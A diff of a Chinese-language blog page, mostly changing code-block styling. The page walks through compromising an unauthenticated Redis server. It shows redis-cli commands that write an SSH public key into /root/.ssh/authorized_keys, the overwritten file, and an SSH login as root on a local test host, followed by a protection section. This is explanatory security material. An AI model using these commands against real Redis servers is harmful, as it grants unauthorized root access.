@@ -26,7 +26,7 @@
 <meta property="og:description" content="&#x2F;* http:&#x2F;&#x2F;prismjs.com&#x2F;download.html?themes&#x3D;prism&amp;languages&#x3D;markup+css+clike+javascript+abap+actionscript+ada+apacheconf+apl+applescript+asciidoc+aspnet">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-12-01T09:56:00.000Z">
-<meta property="article:modified_time" content="2021-12-01T10:03:03.915Z">
+<meta property="article:modified_time" content="2021-12-27T11:19:59.364Z">
 <meta property="article:author" content="fangjin">
 <meta property="article:tag" content="redis">
 <meta name="twitter:card" content="summary">
@@ -479,9 +479,9 @@ pre[data-line] {
 
     <div class="code-title">
       <a name="&#x5165;&#x4FB5;redis">&#x5165;&#x4FB5;redis</a>
-      <span>text</span>
+      <span>shell-session</span>
     </div>
-    <pre data-role="codeBlock" data-info="text { file=&quot;&#x5165;&#x4FB5;redis&quot; }" class="language-text">[root@fangjin ~]# redis-cli -h 127.0.0.1 -p 6379
+    <pre data-role="codeBlock" data-info="shell-session { file=&quot;&#x5165;&#x4FB5;redis&quot; }" class="language-shell-session"><span class="token shell-symbol">[root@fangjin ~]#</span> redis-cli -h 127.0.0.1 -p 6379
 127.0.0.1:6379&gt; set #key &quot;\n\nssh-rsa AAAAB3NzaCxxxxx\n\n&quot;
 OK
 127.0.0.1:6379&gt; config set dir /root/.ssh
@@ -490,36 +490,34 @@ OK
 OK
 127.0.0.1:6379&gt; save
 OK
-127.0.0.1:6379&gt;
 </pre><p>&#x5229;&#x7528; redis &#x7684;&#x6301;&#x4E45;&#x5316;&#x5C06;&#x952E;&#x503C;&#x5BF9;&#x7F13;&#x5B58;&#x5230; /root/.ssh/authorized_keys &#x4E2D;&#xFF1A;</p>
 
     <div class="code-title">
       <a name="authorized_keys &#x88AB;&#x6539;&#x5199;">authorized_keys &#x88AB;&#x6539;&#x5199;</a>
-      <span>text</span>
+      <span>shell-session</span>
     </div>
-    <pre data-role="codeBlock" data-info="text { file=&quot;authorized_keys &#x88AB;&#x6539;&#x5199;&quot; }" class="language-text">[root@e9ea89bbb38e .ssh]# cat /root/.ssh/authorized_keys
+    <pre data-role="codeBlock" data-info="shell-session { file=&quot;authorized_keys &#x88AB;&#x6539;&#x5199;&quot; }" class="language-shell-session"><span class="token shell-symbol">[root@e9ea89bbb38e .ssh]#</span> cat /root/.ssh/authorized_keys
 
 
 Raof-preamble&#xFFFD;&#xFFFD;&#xFFFD;#keyver5.0.8&#xFFFD;
 &#xFFFD;edis-bits&#xFFFD;@&#xFFFD;ctime&#xFFFD;YE&#xFFFD;aused-mem&#xFFFD;&#xFFFD;&#xFFFD;
 sh-rsa AAAAB3NzaCxxxxx
 
-&#xFFFD;&#xFFFD;&#xFFFD;&#x534;&#xFFFD;&#xFFFD;rw[root@e9ea89bbb38e .ssh]#
+&#xFFFD;&#xFFFD;&#xFFFD;&#x534;&#xFFFD;&#xFFFD;rw<span class="token shell-symbol">[root@e9ea89bbb38e .ssh]#</span>
 </pre><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x516C;&#x94A5;&#x660E;&#x6587;&#x5DF2;&#x7ECF;&#x88AB;&#x5199;&#x5165;&#xFF0C;&#x6B64;&#x65F6;&#x76F4;&#x63A5;&#x901A;&#x8FC7; ssh &#x8FDE;&#x63A5;&#x5C31;&#x80FD;&#x62FF;&#x5230; root &#x6743;&#x9650;&#xFF1A;</p>
 
     <div class="code-title">
       <a name="ssh &#x5165;&#x4FB5;">ssh &#x5165;&#x4FB5;</a>
-      <span>text</span>
+      <span>shell-session</span>
     </div>
-    <pre data-role="codeBlock" data-info="text { file=&quot;ssh &#x5165;&#x4FB5;&quot; }" class="language-text">[root@fangjin ~]# ssh -p 22 -i ~/.ssh/fangjin root@127.0.0.1
+    <pre data-role="codeBlock" data-info="shell-session { file=&quot;ssh &#x5165;&#x4FB5;&quot; }" class="language-shell-session"><span class="token shell-symbol">[root@fangjin ~]#</span> ssh -p 22 -i ~/.ssh/fangjin root@127.0.0.1
 The authenticity of host &apos;[127.0.0.1]:22 ([127.0.0.1]:22)&apos; can&apos;t be established.
 ECDSA key fingerprint is SHA256:B+N75iAqdN1g0TuXZXv0LgScZeTgvrsG2rQdS1o4L7U.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added &apos;[127.0.0.1]:22&apos; (ECDSA) to the list of known hosts.
 Last login: Wed Dec  1 09:54:00 2021 from gateway
-[root@e9ea89bbb38e ~]# whoami
+<span class="token shell-symbol">[root@e9ea89bbb38e ~]#</span> whoami
 root
-[root@e9ea89bbb38e ~]#
 </pre><h3 class="mume-header" id="%E9%98%B2%E6%8A%A4"><a href="#%E9%98%B2%E6%8A%A4">&#x9632;&#x62A4;</a></h3>
 
 <ul>
